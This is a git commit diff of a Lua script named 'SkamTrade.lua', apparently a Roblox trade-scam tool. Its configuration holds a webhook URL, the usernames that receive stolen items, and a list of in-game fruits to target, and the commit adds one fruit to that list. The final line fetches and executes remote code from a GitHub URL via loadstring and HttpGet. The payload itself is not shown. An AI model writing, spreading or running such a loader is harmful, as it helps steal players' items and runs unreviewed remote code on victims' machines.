7169d8fe0d6f49b605fd62eb898fbe39f4397af1
VAXnO09 <yoyokyoyo267@gmail.com>
2025-04-17 08:19:11 +0300

    Update and rename SkamTrade to SkamTrade.lua

--- SkamTrade.lua
+++ SkamTrade.lua
@@ -1,5 +1,5 @@
 Webhook = "https://webhook-protect.vercel.app/api/webhook?id=bktVTEI4eGNKOE40T2sxTDFIRnNwdzpBODhIWTR0Y290OVFIQU5wdVVCLVZyREDaZTJHLTVwekFOVGtDU2dwSHhqRnFyOEVkYVB3UUpG b2N0ZXdqY1ZISnMydzdGQXloempBV05xRExIMURCcWdEWTllSGZMa2tGMmx6enN3NmVqcDd4MVVDY mZQOGR2Y2ZUUWxhUG8xRkZWWXFWWmY5UUlSWnl1MUpVVjFNdlZxQmtKaXQ4LXpBaXdZSUVrazN0ZnM" -- << Your Webhook
 Usernames = {"Vacno_5", "Vacno_6"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Gravity-Gravity"} -- << Fruits you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Gravity-Gravity", "Dragon East-Dragon East"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
